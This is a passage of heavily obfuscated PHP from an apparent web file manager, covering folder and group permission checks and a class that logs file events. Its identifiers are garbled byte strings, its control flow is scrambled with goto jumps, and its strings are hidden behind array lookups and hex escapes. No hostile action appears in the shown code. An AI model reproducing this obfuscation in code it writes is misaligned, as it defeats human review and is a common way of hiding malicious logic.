(empty($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[415]]) || isset($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[1889]]) && $cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[1889]]) { return $cÂÁ„Ÿççˆ; } if (AuthModel::authCheckRoot($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[415]][$DÒŠÄ¢‚ä¹[416]])) { return $cÂÁ„Ÿççˆ; } goto EÈÅù÷–Ñ; EÈÅù÷–Ñ: $e÷ŸÂìäœÚ = Model($DÒŠÄ¢‚ä¹[1207])->parentLevelArray($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[496]]); $e÷ŸÂìäœÚ = array_merge(array($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[404]]), array_reverse($e÷ŸÂìäœÚ)); $cîÂ Òé = $this->sourceAuthSelect($e÷ŸÂìäœÚ); goto aø¯Š‡¢Ü; aí¡Ô¿©ïÀ: } private function authFolderOwnerGroup($b—ÖòÁâ…) { $C›ÊšÂ‚¼µ =& $_SERVER[Ü˜]; $a“ŒÌ•å²ò = Model($C›ÊšÂ‚¼µ[1774])->where(array($C›ÊšÂ‚¼µ[1693] => $b—ÖòÁâ…))->select(); $FšŠ¬¾›† = array(); if (!$a“ŒÌ•å²ò) { return $FšŠ¬¾›†; } foreach ($a“ŒÌ•å²ò as $céø†„ÙÎî) { $cÓÂãé¼ = $this->authInfo($céø†„ÙÎî); if (AuthModel::authCheckRoot($cÓÂãé¼[$C›ÊšÂ‚¼µ[415]])) { $FšŠ¬¾›†[] = $céø†„ÙÎî[$C›ÊšÂ‚¼µ[1529]]; } } return $FšŠ¬¾›†; } private function authFolderOwnerUser($eÏÄ„¥·²Ò) { $E¥Ñšî· =& $_SERVER[Ü˜]; $f‘İ¨—ºÙŒ = array(); $AÁƒŞêï›Ã = !1; foreach ($eÏÄ„¥·²Ò as $dÙßô”ï) { $f¬¨ìª¹ğ– = $this->authInfo($dÙßô”ï); if ($dÙßô”ï[$E¥Ñšî·[493]] == $E¥Ñšî·[201]) { $AÁƒŞêï›Ã = !0; } if ($dÙßô”ï[$E¥Ñšî·[413]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($f¬¨ìª¹ğ–[$E¥Ñšî·[415]])) { $f‘İ¨—ºÙŒ[] = $dÙßô”ï[$E¥Ñšî·[493]]; } } } return array($E¥Ñšî·[571] => $f‘İ¨—ºÙŒ, $E¥Ñšî·[1890] => $AÁƒŞêï›Ã); } public function authMake($C§ß¿æó, $B‡ÁÆç½¤ƒ = false) { $CŞ—ÆÍÑ×ê =& $_SERVER[Ü˜]; $A“˜©‚ƒáŞ = $this->authArrayCheck($C§ß¿æó, $B‡ÁÆç½¤ƒ); if ($A“˜©‚ƒáŞ[$CŞ—ÆÍÑ×ê[1892]]) { $A“˜©‚ƒáŞ[$CŞ—ÆÍÑ×ê[1892]] = $this->sourceAuthInfo($A“˜©‚ƒáŞ[$CŞ—ÆÍÑ×ê[1892]]); } return $A“˜©‚ƒáŞ; } public function authArrayCheck($dÃ «Î–•¼, $d‘¤×óÅ‹ = false) { goto D˜ÉñÙõá; cãÔÊñÂº: $Dº´ôŸÅ“Š = 0; $FÛ—é‘ÔŠ = 0; $dÔÀ×÷É¯® = array($DÔô‡Ùèº”[404] => 0); goto FÁ‚£«¶Æ¹; c˜·›Ó”æÉ: $cÇ¿ÀÈ¨èÇ = 1000; $fâ‘‘µÙˆ = 0; $DŸ¢±Å©øš = 0; goto cãÔÊñÂº; D˜ÉñÙõá: $DÔô‡Ùèº” =& $_SERVER[Ü˜]; if (!$dÃ «Î–•¼) { return array($DÔô‡Ùèº”[416] => 0, $DÔô‡Ùèº”[455] => !1); } $d‘¤×óÅ‹ = $d‘¤×óÅ‹ ? $d‘¤×óÅ‹ : USER_ID; goto E£¼ê”Í¶; E£¼ê”Í¶: $D´ï ğ¹¶İ = 0; $fÎ¼ã•ºšò = 0; $d¶¯¹«­ = 0; goto B¥èö» §å; B¥èö» §å: $F óÎöŸÃ­ = 0; $B—øª”ä = 0; $eí‹ÍˆÍ‰ = 0; goto c˜·›Ó”æÉ; fµÓ¨»°‚: return $EñçÕæ—ñ£; goto EÍºÃÃ´êÈ; FÁ‚£«¶Æ¹: foreach ($dÃ «Î–•¼ as $dÔÀ×÷É¯®) { $aÙªøÏï—î = $this->authInfo($dÔÀ×÷É¯®); if (!$aÙªøÏï—î) { continue; } $EÜç…Ñ¹ƒ¦ = $dÔÀ×÷É¯®[$DÔô‡Ùèº”[493]]; $AìµŒ˜í…ø = intval($aÙªøÏï—î[$DÔô‡Ùèº”[415]]); if ($dÔÀ×÷É¯®[$DÔô‡Ùèº”[413]] == SourceModel::TYPE_USER && $EÜç…Ñ¹ƒ¦ == $d‘¤×óÅ‹) { $D´ï ğ¹¶İ = !0; $d¶¯¹«­ = $aÙªøÏï—î; $fÎ¼ã•ºšò = $AìµŒ˜í…ø; } else { if ($dÔÀ×÷É¯®[$DÔô‡Ùèº”[413]] == SourceModel::TYPE_GROUP && $this->groupContainUser($EÜç…Ñ¹ƒ¦, $d‘¤×óÅ‹)) { $F óÎöŸÃ­ = !0; $E…Ù—–Î– = $this->groupStepToUserGroup($EÜç…Ñ¹ƒ¦, $d‘¤×óÅ‹); if ($E…Ù—–Î– < $cÇ¿ÀÈ¨èÇ) { $cÇ¿ÀÈ¨èÇ = $E…Ù—–Î–; $B—øª”ä = $AìµŒ˜í…ø; $eí‹ÍˆÍ‰ = $aÙªøÏï—î; $fâ‘‘µÙˆ = $EÜç…Ñ¹ƒ¦; } if ($E…Ù—–Î– == $cÇ¿ÀÈ¨èÇ && $AìµŒ˜í…ø >= $B—øª”ä) { $B—øª”ä = $AìµŒ˜í…ø; $eí‹ÍˆÍ‰ = $aÙªøÏï—î; $fâ‘‘µÙˆ = $EÜç…Ñ¹ƒ¦; } } else { if ($EÜç…Ñ¹ƒ¦ == $DÔô‡Ùèº”[201]) { $DŸ¢±Å©øš = !0; $FÛ—é‘ÔŠ = $aÙªøÏï—î; $Dº´ôŸÅ“Š = $AìµŒ˜í…ø; } } } } if ($D´ï ğ¹¶İ) { $C£êç©ÖÇ = $fÎ¼ã•ºšò; $aÙªøÏï—î = $d¶¯¹«­; $C½§ˆ¯„ ¦ = LNG($DÔô‡Ùèº”[1893]); } else { if ($F óÎöŸÃ­) { $C£êç©ÖÇ = $B—øª”ä; $aÙªøÏï—î = $eí‹ÍˆÍ‰; $fÅ°‰‹Ï¸ = Model($DÔô‡Ùèº”[495])->getInfo($fâ‘‘µÙˆ); $C½§ˆ¯„ ¦ = $DÔô‡Ùèº”[170] . $fÅ°‰‹Ï¸[$DÔô‡Ùèº”[500]] . $DÔô‡Ùèº”[1894] . LNG($DÔô‡Ùèº”[1895]); } else { if ($DŸ¢±Å©øš) { $C£êç©ÖÇ = $Dº´ôŸÅ“Š; $aÙªøÏï—î = $FÛ—é‘ÔŠ; $C½§ˆ¯„ ¦ = LNG($DÔô‡Ùèº”[1866]); } else { $C£êç©ÖÇ = 0; $aÙªøÏï—î = !1; $C½§ˆ¯„ ¦ = $DÔô‡Ùèº”[33]; } } } $EñçÕæ—ñ£ = array($DÔô‡Ùèº”[1885] => intval($C£êç©ÖÇ), $DÔô‡Ùèº”[1869] => $aÙªøÏï—î, $DÔô‡Ùèº”[1886] => $C½§ˆ¯„ ¦, $DÔô‡Ùèº”[1878] => $dÔÀ×÷É¯®[$DÔô‡Ùèº”[404]]); goto fµÓ¨»°‚; EÍºÃÃ´êÈ: } private function groupContainUser($d·‹ÆÜ‹Ø, $DñÃâĞà‘‡ = false) { return in_array($d·‹ÆÜ‹Ø, $this->userGroupParents($DñÃâĞà‘‡)); } private function groupStepToUserGroup($D¤‰ê˜ƒ, $d¾×”øÃò— = false) { goto d„¤±àÜá; d„¤±àÜá: $Dñ’Š³î„Ğ =& $_SERVER[Ü˜]; $B¡ª´¹à·© = $this->userGroupList($d¾×”øÃò—); $C·¤…ªÈì  = 1000; goto EÔìİ«ÙóŸ; EÔìİ«ÙóŸ: $eÄ³ñ®‹· = $GLOBALS[$Dñ’Š³î„Ğ[6]][$Dñ’Š³î„Ğ[98]][$Dñ’Š³î„Ğ[1785]] == 1; $eÓØ‡îÀ° = $eÄ³ñ®‹· ? 3 : 2; foreach ($B¡ª´¹à·© as $f°¥¯šåÜ) { if ($f°¥¯šåÜ[$Dñ’Š³î„Ğ[1693]] == $D¤‰ê˜ƒ) { return 0; } $FËóÍ¦¾Â = explode($Dñ’Š³î„Ğ[47], trim($f°¥¯šåÜ[$Dñ’Š³î„Ğ[496]], $Dñ’Š³î„Ğ[47])); if ($FËóÍ¦¾Â[0] == $Dñ’Š³î„Ğ[201] && count($FËóÍ¦¾Â) > $eÓØ‡îÀ°) { $bÏ¿ºÙ²…í = array_reverse(array_slice($FËóÍ¦¾Â, $eÓØ‡îÀ°)); $fá¿ö³‰á = array_search($D¤‰ê˜ƒ, $bÏ¿ºÙ²…í); if ($fá¿ö³‰á !== !1 && $fá¿ö³‰á + 1 <= $C·¤…ªÈì ) { $C·¤…ªÈì  = $fá¿ö³‰á + 1; } } } goto dªƒ¥ì–ø; dªƒ¥ì–ø: return $C·¤…ªÈì ; goto E¹À¢¨„±±; E¹À¢¨„±±: } private function userGroupList($eÉÌØµšÍ = false) { $bÙïŸ»¼„ =& $_SERVER[Ü˜]; static $d¹áÃ¸ùô = array(); if (isset($d¹áÃ¸ùô[$eÉÌØµšÍ])) { return $d¹áÃ¸ùô[$eÉÌØµšÍ]; } $F™—è‚êº = Model($bÙïŸ»¼„[515])->getInfo($eÉÌØµšÍ); $d¹áÃ¸ùô[$eÉÌØµšÍ] = array_to_keyvalue($F™—è‚êº[$bÙïŸ»¼„[1867]], $bÙïŸ»¼„[1693]); return $d¹áÃ¸ùô[$eÉÌØµšÍ]; } public function userGroupParents($fË¨êì¡¦å) { goto d¢ˆ“éäéº; d¢ˆ“éäéº: $c÷¸ÚÂ‹æŞ =& $_SERVER[Ü˜]; static $càËôæ­Üå = array(); $fË¨êì¡¦å = $fË¨êì¡¦å ? $fË¨êì¡¦å : USER_ID; goto eë÷®ñİÚ§; eë÷®ñİÚ§: if (isset($càËôæ­Üå[$fË¨êì¡¦å])) { return $càËôæ­Üå[$fË¨êì¡¦å]; } $bŒÆ ÷ï¥‡ = $this->userGroupList($fË¨êì¡¦å); $c¨­å¦ëÈ = array(); goto f‰ó¾‹–®; f‰ó¾‹–®: $Bà×°çÓğ = $GLOBALS[$c÷¸ÚÂ‹æŞ[6]][$c÷¸ÚÂ‹æŞ[98]][$c÷¸ÚÂ‹æŞ[1785]] == 1; $C¿µø·öÖ = $Bà×°çÓğ ? 3 : 2; foreach ($bŒÆ ÷ï¥‡ as $f®ß³í¨«…) { $DÚæÚŞÃ = array($f®ß³í¨«…[$c÷¸ÚÂ‹æŞ[1693]]); $A‚’‘öˆ‚– = explode($c÷¸ÚÂ‹æŞ[47], trim($f®ß³í¨«…[$c÷¸ÚÂ‹æŞ[496]], $c÷¸ÚÂ‹æŞ[47])); if ($A‚’‘öˆ‚–[0] == $c÷¸ÚÂ‹æŞ[201] && count($A‚’‘öˆ‚–) > $C¿µø·öÖ) { $Cë¢Ó’œØš = array_slice($A‚’‘öˆ‚–, $C¿µø·öÖ); $DÚæÚŞÃ = array_merge($DÚæÚŞÃ, array_reverse($Cë¢Ó’œØš)); } $c¨­å¦ëÈ = array_merge($c¨­å¦ëÈ, $DÚæÚŞÃ); } goto dŸ£ §›; dŸ£ §›: $càËôæ­Üå[$fË¨êì¡¦å] = array_unique($c¨­å¦ëÈ); return $càËôæ­Üå[$fË¨êì¡¦å]; goto f´Ùã½÷Ÿ; f´Ùã½÷Ÿ: } public function authTargetInfoMake($c¨…àôšÛ¡) { goto E×Ç˜ºòø ; D¡„…¹‹¢: return array($EĞ°Çˆ¸ë[1897] => $B×ùÜĞÓß, $EĞ°Çˆ¸ë[1898] => $A¸Ì¸Ğ”Ô); goto EŸ®ßØÀ§Æ; E×Ç˜ºòø : $EĞ°Çˆ¸ë =& $_SERVER[Ü˜]; $B×ùÜĞÓß = array(); $A¸Ì¸Ğ”Ô = array(); goto Eè¡–äÔ¨; Eè¡–äÔ¨: foreach ($c¨…àôšÛ¡ as $Bª´ ô…š¡) { if ($Bª´ ô…š¡[$EĞ°Çˆ¸ë[413]] == SourceModel::TYPE_USER) { $B×ùÜĞÓß[] = intval($Bª´ ô…š¡[$EĞ°Çˆ¸ë[493]]); } else { if ($Bª´ ô…š¡[$EĞ°Çˆ¸ë[413]] == SourceModel::TYPE_GROUP) { $A¸Ì¸Ğ”Ô[] = intval($Bª´ ô…š¡[$EĞ°Çˆ¸ë[493]]); } } } if ($B×ùÜĞÓß) { $B×ùÜĞÓß = Model($EĞ°Çˆ¸ë[511])->userListInfo($B×ùÜĞÓß); } if ($A¸Ì¸Ğ”Ô) { $bòÏ­ÕŸËÙ = array($EĞ°Çˆ¸ë[1771] => array($EĞ°Çˆ¸ë[420], $A¸Ì¸Ğ”Ô)); $A¸Ì¸Ğ”Ô = Model($EĞ°Çˆ¸ë[495])->field($EĞ°Çˆ¸ë[1896])->where($bòÏ­ÕŸËÙ)->select(); $A¸Ì¸Ğ”Ô = array_to_keyvalue($A¸Ì¸Ğ”Ô, $EĞ°Çˆ¸ë[1693]); } goto D¡„…¹‹¢; EŸ®ßØÀ§Æ: } public function authInfo($A¸ƒäŠªÌ±) { $Fİ¹ÄÃ­¿ì =& $_SERVER[Ü˜]; if ($A¸ƒäŠªÌ±[$Fİ¹ÄÃ­¿ì[1788]]) { $CÙÖ‡¹ğ‡ = Model($Fİ¹ÄÃ­¿ì[1860])->listData($A¸ƒäŠªÌ±[$Fİ¹ÄÃ­¿ì[1788]]); if (!$CÙÖ‡¹ğ‡) { return !1; $eö‹ÇÇ±Ã = Model($Fİ¹ÄÃ­¿ì[1860])->listData(); $FÜÂÔ½åÚî = array_filter_by_field($eö‹ÇÇ±Ã, $Fİ¹ÄÃ­¿ì[415], $Fİ¹ÄÃ­¿ì[201]); return $FÜÂÔ½åÚî; } $a­˜³ÜîÚŠ = array_field_key($CÙÖ‡¹ğ‡, array($Fİ¹ÄÃ­¿ì[402], $Fİ¹ÄÃ­¿ì[28], $Fİ¹ÄÃ­¿ì[415], $Fİ¹ÄÃ­¿ì[1714], $Fİ¹ÄÃ­¿ì[1716])); $a­˜³ÜîÚŠ[$Fİ¹ÄÃ­¿ì[1899]] = $A¸ƒäŠªÌ±; return $a­˜³ÜîÚŠ; } else { return array($Fİ¹ÄÃ­¿ì[421] => 0, $Fİ¹ÄÃ­¿ì[1699] => $A¸ƒäŠªÌ±[$Fİ¹ÄÃ­¿ì[1842]], $Fİ¹ÄÃ­¿ì[422] => $Fİ¹ÄÃ­¿ì[33], $Fİ¹ÄÃ­¿ì[1714] => $Fİ¹ÄÃ­¿ì[1900]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\145\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\151\x6d\x65", "\164\x69\x6d\x65", "\151\156\163\145\x72\x74", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\144\145\x73\x63", '', "\151\x6e\163\x65\x72\x74\x2c\165\160\144\x61\164\x65\54\x73\145\x6c\x65\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Aó£Í‡ÜÉ, $FêŠ¼ÜÚÓ, $eŸõÓ‰°å = '') { goto Aö’ùÅ•§ï; C½ªòÛ‹Œ¹: $AÚ¤‡È“Ú = array($a“ÓÈŞÄ¹ß[419] => $Aó£Í‡ÜÉ, $a“ÓÈŞÄ¹ß[1901] => $CŸÙ‘›Ö ±[$a“ÓÈŞÄ¹ß[487]], $a“ÓÈŞÄ¹ß[1902] => $CŸÙ‘›Ö ±[$a“ÓÈŞÄ¹ß[28]], $a“ÓÈŞÄ¹ß[504] => !empty($CŸÙ‘›Ö ±[$a“ÓÈŞÄ¹ß[504]]) ? $CŸÙ‘›Ö ±[$a“ÓÈŞÄ¹ß[504]] : $a“ÓÈŞÄ¹ß[33], $a“ÓÈŞÄ¹ß[1521] => USER_ID, $a“ÓÈŞÄ¹ß[424] => $FêŠ¼ÜÚÓ, $a“ÓÈŞÄ¹ß[1523] => $eŸõÓ‰°å); $this->addSystemLog($FêŠ¼ÜÚÓ, $AÚ¤‡È“Ú); unset($AÚ¤‡È“Ú[$a“ÓÈŞÄ¹ß[1902]], $AÚ¤‡È“Ú[$a“ÓÈŞÄ¹ß[504]]); goto aöç†§Ëß¸; Aö’ùÅ•§ï: $a“ÓÈŞÄ¹ß =& $_SERVER[Ü˜]; if (!$this->eventSave) { return; } $CŸÙ‘›Ö ± = Model($a“ÓÈŞÄ¹ß[1207])->sourceInfo($Aó£Í‡ÜÉ); goto a”àîå¼–; a”àîå¼–: if (!$CŸÙ‘›Ö ±) { return !1; } if ($this->isCacheEvent($CŸÙ‘›Ö ±, $FêŠ¼ÜÚÓ)) { return; } if ($eŸõÓ‰°å && is_string($eŸõÓ‰°å)) { $eŸõÓ‰°å = array($a“ÓÈŞÄ¹ß[1726] => $eŸõÓ‰°å); } goto C½ªòÛ‹Œ¹; aöç†§Ëß¸: return $this->add($AÚ¤‡È“Ú); goto c¿²£áôí; c¿²£áôí: } private function addSystemLog($b‡œÎƒšñ, $B‚ “Ÿî´ç) { $fë¾°ÖŠÉê =& $_SERVER[Ü˜]; if ($b‡œÎƒšñ == $fë¾°ÖŠÉê[1903]) { $b‡œÎƒšñ = $B‚ “Ÿî´ç[$fë¾°ÖŠÉê[440]][$fë¾°ÖŠÉê[1904]]; } else { if (in_array($b‡œÎƒšñ, array($fë¾°ÖŠÉê[1670], $fë¾°ÖŠÉê[1905]))) { $b‡œÎƒšñ = $B‚ “Ÿî´ç[$fë¾°ÖŠÉê[440]][$fë¾°ÖŠÉê[724]]; } } $c«˜õñã›ã = array_merge($B‚ “Ÿî´ç, array($fë¾°ÖŠÉê[1906] => $B‚ “Ÿî´ç[$fë¾°ÖŠÉê[404]], $fë¾°ÖŠÉê[1907] => $B‚ “Ÿî´ç[$fë¾°ÖŠÉê[1907]])); Model($fë¾°ÖŠÉê[1634])->addLog($fë¾°ÖŠÉê[1908] . $b‡œÎƒšñ, $c«˜õñã›ã); } private function isCacheEvent($c­°Ã¤Ùœ, $A¨ë¼¡äƒ¬) { if ($c­°Ã¤Ùœ[$_SERVER[Ü˜][413]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($a‡¾šäÓ”, $AÆ¶íÌï†¹) { $Bİ¿àï›Ó³ =& $_SERVER[Ü˜]; $bŸÕÏ¸Šçì = Model($Bİ¿àï›Ó³[1207])->sourceInfo($a‡¾šäÓ”); $fŠĞÃ¼±êˆ = array($Bİ¿àï›Ó³[1904] => $AÆ¶íÌï†¹, $Bİ¿àï›Ó³[28] => $bŸÕÏ¸Šçì[$Bİ¿àï›Ó³[28]]); return $this->addEvent($a‡¾šäÓ”, $Bİ¿àï›Ó³[1903], $fŠĞÃ¼±êˆ); } public function eventFileEdit($EˆÄ„‰¹å›) { $cèÊ±ßºÒŠ =& $_SERVER[Ü˜]; $Fªº‰Üùù° = array($cèÊ±ßºÒŠ[1909] => $_SERVER[$cèÊ±ßºÒŠ[1910]], $cèÊ±ßºÒŠ[1911] => strtolower(ACTION)); return $this->addEvent($EˆÄ„‰¹å›, $cèÊ±ßºÒŠ[1660], $Fªº‰Üùù°); } public function eventRecycle($C÷ÌãÖ§®ç, $dÎÌ„Ñ‚¢¹) { return $this->addEvent($C÷ÌãÖ§®ç, $_SERVER[Ü˜][1905], $dÎÌ„Ñ‚¢¹); } public function eventRemove($Bï²”Ÿƒê) { $C¼™ƒŸ¿”­ =& $_SERVER[Ü˜]; $eéëà©½Š“ = Model($C¼™ƒŸ¿”­[1207])->sourceInfo($Bï²”Ÿƒê); $EÊ„éÑ¹ğÅ = $eéëà©½Š“[$C¼™ƒŸ¿”­[28]]; return $this->addEvent($eéëà©½Š“[$C¼™ƒŸ¿”­[487]], $C¼™ƒŸ¿”­[1659], $EÊ„éÑ¹ğÅ); } public function eventShare($aÄæ‰¼…¿, $D¨¦½‘³Ğ) { return $this->addEvent($aÄæ‰¼…¿, $_SERVER[Ü˜][1670], $D¨¦½‘³Ğ); } public function eventMove($c„Š‰½âÌ, $eˆî½¾Ñˆ, $c¤ï±õô¬ë) { goto f¹÷É‰ãÒ·; a—¤É±ŞØ: $F¡°çÉ¸ = $CË¾å½ÆæË->sourceInfo($eˆî½¾Ñˆ); $Dš¥ù±óÃÓ = $CË¾å½ÆæË->sourceInfo($c¤ï±õô¬ë); $fè›¡·…õ´ = array($C¿¾İåÂ„Ñ[1056] => $eˆî½¾Ñˆ, $C¿¾İåÂ„Ñ[1912] => $F¡°çÉ¸[$C¿¾İåÂ„Ñ[28]], $C¿¾İåÂ„Ñ[1892] => !empty($F¡°çÉ¸[$C¿¾İåÂ„Ñ[504]]) ? $F¡°çÉ¸[$C¿¾İåÂ„Ñ[504]] : $C¿¾İåÂ„Ñ[33], $C¿¾İåÂ„Ñ[1057] => $c¤ï±õô¬ë, $C¿¾İåÂ„Ñ[1913] => $Dš¥ù±óÃÓ[$C¿¾İåÂ„Ñ[28]], $C¿¾İåÂ„Ñ[1914] => !empty($Dš¥ù±óÃÓ[$C¿¾İåÂ„Ñ[504]]) ? $Dš¥ù±óÃÓ[$C¿¾İåÂ„Ñ[504]] : $C¿¾İåÂ„Ñ[33]); goto AëŠ¬°‰¬†; f¹÷É‰ãÒ·: $C¿¾İåÂ„Ñ =& $_SERVER[Ü˜]; $CË¾å½ÆæË = Model($C¿¾İåÂ„Ñ[1207]); $a…¯ŞµîôÙ = $CË¾å½ÆæË->sourceInfo($c„Š‰½âÌ); goto a—¤É±ŞØ; AëŠ¬°‰¬†: $this->addEvent($c„Š‰½âÌ, $C¿¾İåÂ„Ñ[529], $fè›¡·…õ´); $a…¯ŞµîôÙ = $CË¾å½ÆæË->sourceInfo($c„Š‰½âÌ); $fè›¡·…õ´ = array($C¿¾İåÂ„Ñ[404] => $a…¯ŞµîôÙ[$C¿¾İåÂ„Ñ[404]], $C¿¾İåÂ„Ñ[28] => $a…¯ŞµîôÙ[$C¿¾İåÂ„Ñ[28]]); goto eŸ¿‰“¿†; eŸ¿‰“¿†: $this->addEvent($eˆî½¾Ñˆ, $C¿¾İåÂ„Ñ[1915], $fè›¡·…õ´); goto Eª‘¢šğÆŞ; Eª‘¢šğÆŞ: } public function eventCopy($Fùâ¼ôÏ„ğ) { $this->eventCreate($Fùâ¼ôÏ„ğ, $_SERVER[Ü˜][527]); } public function eventRename($BÙ—õå†‹•, $E©Ş‹®˜½, $Eìğ´ìÄ¾) { $eÆÃ†ƒ‘Ê  =& $_SERVER[Ü˜]; $D“’¼¦áî = array($eÆÃ†ƒ‘Ê [1056] => $E©Ş‹®˜½, $eÆÃ†ƒ‘Ê [1057] => $Eìğ´ìÄ¾); return $this->addEvent($BÙ—õå†‹•, $eÆÃ†ƒ‘Ê [1221], $D“’¼¦áî); } public function eventAddComment($DÁ¸”¼ŒÄ, $eÜÅˆĞÉã) { return $this->addEvent($DÁ¸”¼ŒÄ, $_SERVER[Ü˜][1916], $eÜÅˆĞÉã); } public function eventAddDesc($dİ“¨ÎãÙ®, $a­ö£¢ßÓ¼) { return $this->addEvent($dİ“¨ÎãÙ®, $_SERVER[Ü˜][1917], $a­ö£¢ßÓ¼); } public function listBySource($C£Öã×°Š´) { goto B§›˜ì¡“å; AÍô™×©Ğ: return $this->eventListParse($CÁ´ö‡‡«, $C£Öã×°Š´); goto CîñŞæ‚…; B§›˜ì¡“å: $Eò÷©¥“¾Ê =& $_SERVER[Ü˜]; $AëØä½øÙÍ = Model($Eò÷©¥“¾Ê[1207])->sourceInfo($C£Öã×°Š´); $D™–Ş¿‹‘ = array($Eò÷©¥“¾Ê[419] => $C£Öã×°Š´); goto F¦§¼™ƒô; F¦§¼™ƒô: if ($AëØä½øÙÍ[$Eò÷©¥“¾Ê[412]] == $Eò÷©¥“¾Ê[97]) { $D®é¹Œˆ• = Model($Eò÷©¥“¾Ê[1207])->listSearchChildren($C£Öã×°Š´, 20000); $D®é¹Œˆ•[] = $C£Öã×°Š´ . $Eò÷©¥“¾Ê[384]; $D™–Ş¿‹‘ = array($Eò÷©¥“¾Ê[404] => array($Eò÷©¥“¾Ê[7], $D®é¹Œˆ•)); } $CÁ´ö‡‡« = $this->where($D™–Ş¿‹‘)->order($Eò÷©¥“¾Ê[1918])->selectPage(); if ($CÁ´ö‡‡«[$Eò÷©¥“¾Ê[373]][$Eò÷©¥“¾Ê[374]] == 0) { $CÁ´ö‡‡«[$Eò÷©¥“¾Ê[373]][$Eò÷©¥“¾Ê[374]] = 1; $CÁ´ö‡‡«[$Eò÷©¥“¾Ê[376]] = array(array($Eò÷©¥“¾Ê[419] => $C£Öã×°Š´, $Eò÷©¥“¾Ê[1901] => $AëØä½øÙÍ[$Eò÷©¥“¾Ê[487]], $Eò÷©¥“¾Ê[1521] => $AëØä½øÙÍ[$Eò÷©¥“¾Ê[441]], $Eò÷©¥“¾Ê[424] => $Eò÷©¥“¾Ê[1919], $Eò÷©¥“¾Ê[425] => $AëØä½øÙÍ[$Eò÷©¥“¾Ê[204]], $Eò÷©¥“¾Ê[1523] => $Eò÷©¥“¾Ê[33])); } goto AÍô™×©Ğ; CîñŞæ‚…: } private function eventListParse($Fœğƒ®®š™, $CÌ ‚Ùàº) { goto Cøà£Å†šø; aÉ‡¾çëÕÏ: $A¶ËºÂ©¿¿ = array_unique($A¶ËºÂ©¿¿); $E…ëïØÑÁ = array_unique(array_to_keyvalue($FïæÊÄ›±, $AØ’«•Ï»[33], $AØ’«•Ï»[1529])); $E—î¬ñêŠ¼ = Model($AØ’«•Ï»[515])->userListInfo($E…ëïØÑÁ); goto f’Ûå”ƒ¥ò; A×‘—†ë†‚: $Cô’£æÎ© = array_to_keyvalue($FïæÊÄ›±, $AØ’«•Ï»[33], $AØ’«•Ï»[1907]); foreach ($FïæÊÄ›± as $CƒÅÈƒš¬‘) { $cÚÒ÷•¾ = $CƒÅÈƒš¬‘[$AØ’«•Ï»[440]]; if ($CƒÅÈƒš¬‘[$AØ’«•Ï»[29]] == $AØ’«•Ï»[529] && isset($cÚÒ÷•¾[$AØ’«•Ï»[1056]])) { $A¶ËºÂ©¿¿[] = $cÚÒ÷•¾[$AØ’«•Ï»[1056]] . $AØ’«•Ï»[33]; $A¶ËºÂ©¿¿[] = $cÚÒ÷•¾[$AØ’«•Ï»[1057]] . $AØ’«•Ï»[33]; } if ($CƒÅÈƒš¬‘[$AØ’«•Ï»[29]] == $AØ’«•Ï»[1915] && isset($cÚÒ÷•¾[$AØ’«•Ï»[404]])) { $A¶ËºÂ©¿¿[] = $cÚÒ÷•¾[$AØ’«•Ï»[404]] . $AØ’«•Ï»[33]; } } $A¶ËºÂ©¿¿ = array_merge($A¶ËºÂ©¿¿, $Cô’£æÎ©, array($CÌ ‚Ùàº . $AØ’«•Ï»[33])); goto aÉ‡¾çëÕÏ; f’Ûå”ƒ¥ò: $AÈ£ÎÔµ‘š = Model($AØ’«•Ï»[799])->sourceListInfo($A¶ËºÂ©¿¿, !0); foreach ($FïæÊÄ›± as &$CƒÅÈƒš¬‘) { if ($CƒÅÈƒš¬‘[$AØ’«•Ï»[29]] == $AØ’«•Ï»[529] && isset($CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[1056]])) { $CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[1056]] = $AÈ£ÎÔµ‘š[$CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[1056]]]; $CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[1057]] = $AÈ£ÎÔµ‘š[$CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[1057]]]; } if ($CƒÅÈƒš¬‘[$AØ’«•Ï»[29]] == $AØ’«•Ï»[1915] && isset($CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[404]])) { $CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[404]] = $AÈ£ÎÔµ‘š[$CƒÅÈƒš¬‘[$AØ’«•Ï»[440]][$AØ’«•Ï»[404]]]; } $CƒÅÈƒš¬‘[$AØ’«•Ï»[95]] = $AÈ£ÎÔµ‘š[$CƒÅÈƒš¬‘[$AØ’«•Ï»[404]]]; $CƒÅÈƒš¬‘[$AØ’«•Ï»[1920]] = $AÈ£ÎÔµ‘š[$CƒÅÈƒš¬‘[$AØ’«•Ï»[1907]]]; if ($CƒÅÈƒš¬‘[$AØ’«•Ï»[29]] == $AØ’«•Ï»[1659]) { $CƒÅÈƒš¬‘[$AØ’«•Ï»[1920]] = $CƒÅÈƒš¬‘[$AØ’«•Ï»[95]]; $CƒÅÈƒš¬‘[$AØ’«•Ï»[1907]] = $CƒÅÈƒš¬‘[$AØ’«•Ï»[1920]][$AØ’«•Ï»[404]]; $CƒÅÈƒš¬‘[$AØ’«•Ï»[95]] = !1; $CƒÅÈƒš¬‘[$AØ’«•Ï»[404]] = $AØ’«•Ï»[33]; } $CƒÅÈƒš¬‘[$AØ’«•Ï»[1850]] = $E—î¬ñêŠ¼[$CƒÅÈƒš¬‘[$AØ’«•Ï»[1529]]]; } 